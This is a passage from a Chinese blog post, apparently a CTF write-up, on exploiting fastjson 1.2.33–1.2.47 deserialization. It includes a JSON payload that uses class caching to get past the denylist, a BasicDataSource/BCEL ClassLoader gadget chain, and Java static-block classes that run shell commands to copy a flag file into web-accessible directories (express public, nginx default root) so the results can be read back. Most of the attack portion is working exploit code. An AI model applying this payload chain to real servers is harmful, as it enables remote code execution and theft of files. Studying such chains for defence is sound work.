+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.toJSONString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toJSONString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SerializeWriter out = <span class="keyword">new</span> SerializeWriter();</span><br><span class="line"></span><br><span class="line">    String var2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        (<span class="keyword">new</span> JSONSerializer(out)).write(<span class="keyword">this</span>);</span><br><span class="line">        var2 = out.toString();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>toString方法中进行了序列化，进而调用了getter。</p>
+<p>在fastjson&gt;1.2.36后，代码发生了变化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (object.getClass() == JSONObject.class &amp;&amp; key == <span class="keyword">null</span>) &#123;</span><br><span class="line">    key = <span class="string">&quot;null&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>JSONObject不再进行toString操作，所以就没法利用了，不过调用toString方法的地方还有不少，就在原来toString下面几行代码就有。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (object.getClass() == JSONObject.class &amp;&amp; key == <span class="keyword">null</span>) &#123;</span><br><span class="line">    key = <span class="string">&quot;null&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Object value;</span><br><span class="line">Map var27;</span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">    .......</span><br><span class="line">    map.put(key, value);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((ch &lt; <span class="string">&#x27;0&#x27;</span> || ch &gt; <span class="string">&#x27;9&#x27;</span>) &amp;&amp; ch != <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">this</span>.checkMapResolve(object, key.toString());</span><br></pre></td></tr></table></figure>
+<p>这里只要满足冒号后面跟的不是双引号，并且非0-9、- 字符就能够触发到toString序列化方法。<br>所以将:”ddd”修改为:{ 就可以触发到（使用其他调用getter的方法也可以，$.ref、set等)。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;xxx&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>&#125;,<span class="string">&quot;www&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="string">&quot;c&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>,<span class="string">&quot;driverClassLoader&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,<span class="string">&quot;driverClassName&quot;</span>:<span class="string">&quot;$$BCEL$$xxxxx&quot;</span>&#125;&#125;:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>该利用只有在fastjson 1.2.33 - 1.2.47 可利用， 因为com.sun 在fastjson的黑名单中<br>在fastjson &lt; 33时，checkAutoType方法中，只要在黑名单中就抛出异常。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">    deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在fastjson &gt;= 33时，就算反序列的类在黑名单中，只要反序列的类在缓存中就不会抛出异常，所以能够利用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">    deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>目前已经可以执行任意代码了，不过依然存在一个问题，Springboot + 低权限 + 无DNS不出网+不输出异常信息， 基本只能靠回显来拿到命令执行结果。<br>Springboot本身做回显是非常简单的，不过因为bcel的利用指定了classloader为com.sun.org.apache.bcel.internal.util.ClassLoader，导致不能直接获取到request、response等。<br>通过从当前线程的classloader来获取request、response可解决该问题，<br>Thread.currentThread().getContextClassLoader().loadClass(“javax.servlet.http.HttpServletRequest”), <a target="_blank" rel="noopener" href="https://gist.github.com/fnmsd/2fd47012849f25eb53d703f283679462">可以参考此处</a>。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16322034856306.jpg"></p>
+<p>第二种获取命令执行结果方法，<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16322035158684.jpg"></p>
+<p>可以将命令执行结果写入到WEB目录中，访问文件查看结果。后台给出了WEB目录，这个目录是express的。express写文件需要写到静态文件目录下才能访问到，express静态目录通常使用public目录，所以将结果写入到/home/realweb/public/xxxxx.txt即可。</p>
+<p>大概翻一下文件就能够找到flag在springboot web根目录下, 最后生成该class的BCEL</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /www/realwebapi/flag.txt &gt; /www/realweb/public/yulegeyu.txt&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16322037305682.jpg" alt="-w1534"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/stylesheets/font-awesome.min.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>观察express的前端页面，静态目录是直接映射到根目录的，所以直接访问/yulegeyu.txt 即可拿到flag。</p>
+<p>如果对express不是很熟悉，还能够使用第三种获取命令执行结果方法。<br>很明显能够发现目标用nginx做了反代。/ 给了 express, /api 给了springboot, 这时候查一下目标的ip然后访问。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16322038266977.jpg"></p>
+<p>返回了nginx的403，这也是比较常见的场景，不少反代配置都还是在nginx里新建了一个server。如果直接访问ip因为servername不匹配很可能访问到的是默认server,这时候可以尝试将命令执行结果写入到nginx常见的默认目录里，然后用ip访问默认server拿到结果。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /www/realwebapi/flag.txt &gt; /var/www/html/yulegeyu.txt&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16322038603678.jpg"></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Web/">Web</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 雨了个雨
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
